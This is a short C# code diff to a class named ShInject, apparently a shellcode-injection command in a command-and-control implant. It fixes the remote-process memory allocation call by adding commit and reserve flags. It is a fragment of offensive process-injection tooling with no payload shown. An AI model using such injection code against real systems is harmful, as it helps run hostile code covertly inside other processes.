@@ -35,7 +35,13 @@ public class ShInject : DroneCommand
 
         // allocate memory in process
         var baseAddress = IntPtr.Zero;
-        status = NtAllocateVirtualMemory(hProcess, task.Artefact.Length, MEMORY_PROTECTION.PAGE_READWRITE, ref baseAddress);
+        
+        status = NtAllocateVirtualMemory(
+            hProcess,
+            task.Artefact.Length,
+            MEMORY_ALLOCATION.MEM_COMMIT | MEMORY_ALLOCATION.MEM_RESERVE,
+            MEMORY_PROTECTION.PAGE_READWRITE,
+            ref baseAddress);
 
         if (status != Native.NTSTATUS.Success)
         {
